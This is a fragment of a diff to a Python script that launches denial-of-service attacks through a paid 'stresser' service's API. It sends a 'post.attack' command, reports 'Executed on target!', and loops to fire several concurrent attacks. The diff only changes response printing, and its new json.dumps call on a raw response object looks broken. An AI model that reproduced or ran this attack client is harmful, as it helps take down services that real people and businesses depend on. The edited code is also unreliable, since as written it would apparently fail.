@@ -125,11 +125,8 @@ ID	Name	Type	Description
     baseurl = "http://zdstresser.net/panel/apiv1/?userid=REDACTED&key=REDACTED&command=post.attack&type=ip4" #Put your userid and key where it says redacted
     print("Executing...\n")
     response = requests.get(baseurl, params=payload)
-    responsejson = response.json()
     print("Checking response...")
-    for key, value in responsejson.items():
-        print(key, ":", value)
-    print(str("\nSuccess! Executed: ") + response.url)
+    print(json.dumps(response, indent=4, sort_keys=True))
     print("\nSuccess! Executed on target!")
     time.sleep(5)
     if int(concurrents) == 1:
@@ -265,10 +262,8 @@ ID	Name	Type	Description
         count = 0
         while count < 5:  # set count to maximum concurrents your plan allows
             response = requests.get(baseurl, params=payload)
-            responsejson = response.json()
             print("Checking response...")
-            for key, value in responsejson.items():
-                print(key, ":", value)
+            print(json.dumps(response, indent=4, sort_keys=True))
             print(str("\nSuccess! Executed: ") + response.url)
             count += 1
 
